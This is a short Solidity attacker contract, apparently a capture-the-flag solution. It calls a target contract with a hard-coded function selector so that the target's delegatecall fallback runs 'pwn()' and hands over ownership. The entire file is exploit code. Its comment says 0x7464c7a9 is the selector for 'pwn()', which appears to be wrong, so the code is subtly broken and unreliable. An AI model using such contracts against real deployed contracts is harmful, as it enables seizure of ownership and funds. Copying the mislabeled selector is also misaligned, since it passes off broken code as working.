pragma solidity ^0.8.0;

contract DelegationAttacker {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function callPwn() public {
        bytes4 methodId = 0x7464c7a9; // Precomputed selector for "pwn()"
        (bool success, ) = instance.call(abi.encodeWithSelector(methodId));
        require(success, "Call failed");
    }
}